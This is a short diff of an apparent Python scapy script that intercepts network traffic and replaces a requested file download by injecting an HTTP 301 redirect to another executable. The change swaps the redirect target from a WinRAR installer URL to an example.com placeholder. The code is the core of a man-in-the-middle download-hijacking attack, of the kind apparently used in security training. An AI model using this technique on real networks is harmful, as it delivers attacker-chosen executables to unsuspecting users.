@@ -22,7 +22,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")                                                         # redirects to new .exe file url)
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n" 
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.com/file.exe\n\n" 
 
                 packet.set_payload(str(modified_packet))
 
